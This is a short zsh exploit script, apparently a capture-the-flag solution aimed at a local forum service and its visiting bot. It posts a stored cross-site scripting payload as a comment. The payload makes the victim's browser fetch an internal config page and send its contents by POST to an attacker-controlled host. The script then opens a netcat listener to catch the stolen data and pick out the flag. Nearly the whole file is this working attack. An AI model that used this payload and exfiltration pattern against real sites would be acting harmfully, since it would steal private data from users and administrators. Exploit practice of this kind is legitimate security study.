#!/bin/zsh
# send a payload to poor little bot

((${+1})) || {
	echo "missing cookies!"
	exit 1
}

target=127.0.0.1:4942
thread_id=bbeo32ucx0a65b8

nc_port="${2:-9772}"
host="${3:-192.168.122.1}"

payload="<script>fetch(\"/internal/config\").then(r => r.text()).then(t => { fetch(\"http://$host:$nc_port/\", {method: \"POST\", body: t}) } )</script>"

echo "Sending payload: $payload"
echo

curl -si \
	-b "session=$1" \
	--data-urlencode "content=$payload" \
	http://$target/forum/$thread_id/comment

echo "Starting listener on $nc_port"
nc -l 0.0.0.0 $nc_port | grep flag | jq .
